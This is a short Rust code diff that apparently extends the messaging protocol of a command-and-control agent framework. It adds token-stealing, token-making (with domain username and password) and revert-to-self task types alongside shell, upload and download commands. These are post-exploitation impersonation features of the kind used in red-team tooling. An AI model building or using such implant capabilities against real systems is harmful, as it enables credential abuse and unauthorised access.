@@ -31,6 +31,9 @@ pub enum TaskType {
     Shell,
     Upload,
     Download,
+    StealToken,
+    MakeToken,
+    Rev2Self,
 }
 
 /// Command dispatched to agent (server → agent).
@@ -69,6 +72,19 @@ pub struct FileChunk {
     pub total: u32,
     /// Base64-encoded chunk bytes.
     pub data: String,
+}
+
+/// steal_token payload — JSON-encoded in Command.command.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct StealTokenTask {
+    pub pid: u32,
+}
+
+/// make_token payload — JSON-encoded in Command.command.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct MakeTokenTask {
+    pub domain_user: String,
+    pub password: String,
 }
 
 /// Result upload request (agent → server).
